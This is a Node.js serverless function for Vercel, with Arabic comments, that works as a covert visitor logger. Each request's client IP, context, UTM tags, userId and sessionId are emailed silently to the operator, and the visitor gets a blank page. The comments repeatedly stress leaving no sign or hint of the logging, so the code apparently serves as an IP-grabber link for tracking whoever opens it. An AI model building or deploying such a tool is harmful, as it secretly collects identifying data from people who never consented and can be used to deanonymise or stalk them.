
// api/index.js

// حمّل dotenv اختياريًا للتطوير المحلي فقط
if (process.env.VERCEL !== '1') {
  try {
    require('dotenv').config();
  } catch (e) {
    console.warn('dotenv not loaded (likely running in production on Vercel).');
  }
}

const { getVisitContext, shouldSendForIp } = require('../lib/utils');
const { sendVisitEmail } = require('../lib/email');

// استثناء الستاتيك (favicon, صور, CSS, JS, خطوط...)
const STATIC_EXT_REGEX = /\.(css|js|png|jpg|jpeg|svg|ico|gif|webp|pdf|map|woff2?|ttf|eot|txt)$/i;

module.exports = async (req, res) => {
  // اسمح بـ GET/HEAD فقط
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    res.statusCode = 405;
    return res.end('Method Not Allowed');
  }

  // تجاهل ملفات الستاتيك تمامًا (لا إرسال ولا UI)
  const pathOnly = (req.url || '/').split('?')[0];
  if (STATIC_EXT_REGEX.test(pathOnly)) {
    res.statusCode = 204; // No Content
    return res.end();
  }

  // استخراج السياق (بدون طباعة أي شيء للمستخدم)
  const ctx = getVisitContext(req);

  // بناء الـ payload من Query فقط (صامت)
  const proto = String(req.headers['x-forwarded-proto'] || 'https');
  const host = req.headers.host || '';
  const url = req.url || '/';
  let urlObj;

  try {
    urlObj = new URL(`${proto}://${host}${url}`);
  } catch {
    // في حالة أي مسار غير متوقع، نضمن استمرار التنفيذ بدون كراش
    urlObj = new URL(`${proto}://${host}/`);
  }

  const qp = urlObj.searchParams;

  const payload = {
    utm: {
      source: qp.get('utm_source') || null,
      medium: qp.get('utm_medium') || null,
      campaign: qp.get('utm_campaign') || null,
      term: qp.get('utm_term') || null,
      content: qp.get('utm_content') || null,
    },
    userId: qp.get('userId') || null,
    sessionId: qp.get('sessionId') || null,
  };

  // تهدئة + شرط وجود المتغيرات السرية
  const ip = ctx.clientIP;
  const canSend = shouldSendForIp(ip);

  const { EMAIL_TO, EMAIL_USER, EMAIL_APP_PASSWORD } = process.env;
  const hasSecrets = Boolean(EMAIL_TO && EMAIL_USER && EMAIL_APP_PASSWORD);

  if (canSend && hasSecrets) {
    // إرسال صامت في الخلفية (من غير أي إشارة للزائر)
    (async () => {
      try {
        await sendVisitEmail({ payload, context: ctx });
        // لو عايز صمت كامل، احذف اللوج التالي:
        console.log(`[EMAIL] sent silently for ${ip}`);
      } catch (err) {
        // لوج بسيط للتشخيص بدون كشف أسرار
        console.error('[EMAIL] failed:', err?.message || err);
      }
    })();
  }

  // اختر أحد الردود الصامتة:

  // (أ) رد 204 No Content (صمت تام بلا أي UI)
  // res.statusCode = 204;
  // return res.end();

  // (ب) صفحة فارغة جدًا (لا معلومات، لا تلميحات)
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  return res.end(`<!doctype html><html><head><meta charset="utf-8"><title></title><meta name="viewport" content="width=device-width,initial-scale=1"></head><body></body></html>`);
};
